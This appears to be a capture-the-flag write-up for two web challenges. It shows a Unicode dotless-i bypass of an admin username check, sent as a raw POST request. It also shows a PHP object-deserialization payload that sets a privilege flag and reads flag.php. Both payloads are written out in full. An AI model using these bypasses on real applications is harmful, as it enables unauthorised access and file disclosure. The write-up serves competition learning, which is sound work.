# Tasks

## Unis Love Code

*Unicode problem :)*

We had to bypass the checks on the username while supplying the right one.

The problem lays here

   ```py
   username='ADMIN'
    check_funcs=["strip","lower"]
  def _check_access(self,u):
        for cf in UnisLoveCode.check_funcs:
            # u != admin
            if getattr(str,cf)(UnisLoveCode.username)==u:
                return False
        for c in u:
            if c in string.ascii_uppercase:
                return False
        # u.upper()== ADMIN
        return UnisLoveCode.username.upper()==u.upper()
```

how to bypass the checks here ? --> Use some Unicode fu U+013

```curl


POST / HTTP/1.1
Host: 52.59.124.14:10004
Content-Length: 15

username=admın
```

## Jsonify

show=true&obj={"class":"Flag","properties":{"isAllowedToSeeFlag":"b:1;"}}&flagfile=?

**How to byapss the setFlagFile ??**

there are two paths ( condition ) , bypass it or find a way to set the isAllowedToSeeFlag for the Flag class to true.

 ```php
 public function   setFlagFile($flagfile)
    {
        echo $flagfile;
        if (stristr($flagfile, "flag") || !file_exists($flagfile))
        {
            echo "ERROR:File is not valid!";
            return;
        }
        $this->flagfile = $flagfile;
    }
```

Actually no need to the *setFlagFile* doesn't interfere in the execution flow.all we have to do is set the object.flagfiel=./flag.php with the deserialization.

**final payload**

```show=true&obj=%7B%22class%22%3A%22Flag%22%2C%22properties%22%3A%7B%22isAllowedToSeeFlag%22%3A%22b%3A1%3B%22%2C%22flagfile%22%3A%22s%3A10%3A%5C%22.%2Fflag.php%5C%22%3B%22%7D%7D&flagfile=./flag.php``
